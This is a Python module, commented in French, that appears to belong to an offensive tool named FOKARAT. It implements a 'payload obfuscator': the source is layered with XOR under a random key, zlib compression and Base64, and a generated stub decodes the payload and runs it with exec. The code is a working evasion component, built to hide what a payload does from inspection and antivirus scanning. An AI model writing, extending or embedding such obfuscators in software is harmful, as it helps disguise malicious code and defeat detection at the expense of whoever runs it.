"""
FOKARAT - Obfuscateur de payloads Python
Multi-couches : XOR + zlib + Base64 + découpage.
"""
import base64
import zlib
import random
from core.logger import Logger

logger = Logger()


class PythonObfuscator:

    def _random_key(self, length=32):
        return bytes(random.randint(1, 255) for _ in range(length))

    def _xor(self, data, key):
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

    def obfuscate(self, source_code):
        """Retourne un payload Python obfusqué multi-couches."""
        # Couche 1 : XOR
        key = self._random_key(32)
        xored = self._xor(source_code.encode("utf-8"), key)

        # Couche 2 : Compression zlib niveau max
        compressed = zlib.compress(xored, level=9)

        # Couche 3 : Base64
        b64 = base64.b64encode(compressed).decode("ascii")

        # Couche 4 : Découpage en morceaux
        chunks = [b64[i:i + 80] for i in range(0, len(b64), 80)]
        chunks_code = "\n".join(f'    "{c}"' for c in chunks)
        key_hex = ", ".join(str(b) for b in key)

        obfuscated = f'''# FOKARAT - Payload obfusqué multi-couches
# Généré dynamiquement - Ne pas modifier à la main
import base64 as _b64, zlib as _zlib

_K = bytes([{key_hex}])
_D = (
{chunks_code}
)
_D = _b64.b64decode("".join(_D))
_D = _zlib.decompress(_D)
_D = bytes([c ^ _K[i % len(_K)] for i, c in enumerate(_D)])
exec(compile(_D, "<fokarat>", "exec"))
'''
        logger.success(f"Payload obfusqué : {len(obfuscated)} caractères")
        return obfuscated